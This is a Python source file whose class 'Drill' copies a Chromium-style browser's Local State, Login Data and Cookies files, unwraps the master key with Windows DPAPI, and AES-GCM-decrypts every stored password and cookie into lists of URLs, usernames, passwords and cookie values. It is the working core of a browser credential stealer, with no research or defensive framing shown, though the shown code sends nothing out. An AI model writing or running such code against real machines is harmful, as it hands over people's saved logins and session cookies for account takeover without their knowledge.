import os
import json
from shutil import copyfile
import base64
import win32crypt
import sqlite3
from Cryptodome.Cipher import AES

class Drill:
    DecryptionKey = None
    Path = None
    LoginPath = None
    CookiesPath = None

    Passwords = []
    Cookies = []

    def __init__(self, path, loginFile, cookiesFile):
        if os.path.exists(path):
            self.Path = path
            self.LoginPath = loginFile
            self.CookiesPath = cookiesFile

    def ExtractCredentials(self):
        if self.Path != None:
            # Get the decryption key
            copyfile(self.Path, 'Local State')
            with open('Local State', 'r') as file:
                encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
            encrypted_key = base64.b64decode(encrypted_key)                                       
            encrypted_key = encrypted_key[5:]
            self.DecryptionKey = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            # Get the passwords
            copyfile(os.path.expandvars(self.LoginPath), 'Login Data')
            conn = sqlite3.connect('Login Data')
            cursor = conn.cursor()
            cursor.execute('select origin_url, username_value, password_value from logins;')
            for url, user, value in cursor.fetchall():
                nonce = value[3:3+12]
                ciphertext = value[3+12:-16]
                tag = value[-16:]
                cipher = AES.new(self.DecryptionKey, AES.MODE_GCM, nonce=nonce)
                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                #self.Passwords.append(url + "  =  [" + user + ' , ' + plaintext.decode('utf-8') + ']\n')
                self.Passwords.append({
                    'url': url,
                    'user': user,
                    'password':  plaintext.decode('utf-8')
                })

            # Get the cookies
            copyfile(self.CookiesPath, 'Cookies')
            conn = sqlite3.connect('Cookies')
            cursor = conn.cursor()
            cursor.execute('select host_key, name, encrypted_value from cookies;')
            for host, name, value in cursor.fetchall():
                nonce = value[3:3+12]
                ciphertext = value[3+12:-16]
                tag = value[-16:]
                cipher = AES.new(self.DecryptionKey, AES.MODE_GCM, nonce=nonce)
                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                #self.Cookies.append(f"{host} = [{name} , {plaintext.decode('utf-8')}]\n")
                self.Cookies.append({
                    'host': host,
                    'name': name,
                    'value': plaintext.decode('utf-8')
                })

            return self.Passwords, self.Cookies
        else:
            return [], []